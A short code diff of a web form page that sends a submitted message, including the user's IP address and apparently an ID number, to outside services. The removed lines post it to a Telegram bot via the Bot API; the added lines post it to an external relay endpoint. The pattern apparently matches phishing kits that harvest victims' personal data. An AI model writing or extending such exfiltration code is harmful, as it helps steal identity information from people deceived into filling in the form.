@@ -68,17 +68,11 @@ export default function FormPage() {
 IP Adress: ${ipAddress}`;
 
       try {
-        const response = await fetch(
-          `https://api.telegram.org/bot${botToken}/sendMessage`,
-          {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-            }),
-          }
-        );
+      const response = await fetch("https://wuaze-qata-backend.vercel.app/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: message }),
+      });
 
         if (response.ok) {
           router.push(`/apply?idNumber=${idNumber}`);
